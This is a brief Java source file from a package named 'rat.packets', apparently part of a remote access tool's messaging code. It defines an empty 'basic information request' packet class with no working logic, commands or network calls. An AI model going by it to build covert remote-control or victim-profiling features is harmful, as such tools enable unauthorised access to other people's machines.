package rat.packets;

import java.io.Serializable;

public class BasicInformationRequestPacket implements IPacket, Serializable {

    private static final long serialVersionUID = 9147256268615341687L;

    @Override
    public void execute() {
    }

    @Override
    public PacketType getPacketType() {
        return PacketType.INFORMATION_REQUEST;
    }
}
